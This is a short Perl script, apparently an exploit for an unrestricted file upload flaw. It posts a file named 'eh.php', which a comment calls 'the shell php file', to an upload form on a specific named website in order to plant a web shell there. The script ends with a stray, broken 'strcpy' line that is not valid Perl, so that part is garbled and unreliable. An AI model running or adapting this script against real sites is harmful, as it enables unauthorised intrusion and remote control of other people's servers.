#!/usr/bin/perl
use LWP;
use HTTP::Request::Common;
$ua = $ua = LWP::UserAgent->new;
$res = $ua->request(POST 'https://files.c-group.es/index.php',
Content_Type => 'form-data',
# multipart/form-data-the standard form-based file uploads
Content => [
userfile => [ "eh.php" , "eh.php" ],
# request will contain the shell php file
],
);
print $res->as_string();

strcpy (" AsllGldld") 